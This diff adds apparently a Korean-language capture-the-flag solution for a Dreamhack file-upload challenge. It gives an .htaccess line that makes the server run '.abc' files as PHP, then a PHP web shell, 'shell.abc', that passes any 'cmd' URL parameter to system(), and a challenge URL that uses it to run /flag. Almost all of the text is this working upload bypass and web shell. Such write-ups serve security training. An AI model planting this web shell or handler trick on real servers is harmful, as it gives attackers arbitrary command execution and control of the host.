@@ -1,0 +1,18 @@
+.htaccess 파일 먼저 만들어줌
+
+================================
+AddHandler application/x-httpd-php .abc
+================================
+
+shell.abc 파일 만들어서 업로드
+================================
+<?php
+    # system command execution
+    if(isset($_GET['cmd'])){
+        $cmd = $_GET['cmd'];
+        system($cmd);
+    }
+?>
+================================
+다음 페이지로 접속
+http://host3.dreamhack.games:10051/upload/shell.abc?cmd=/flag
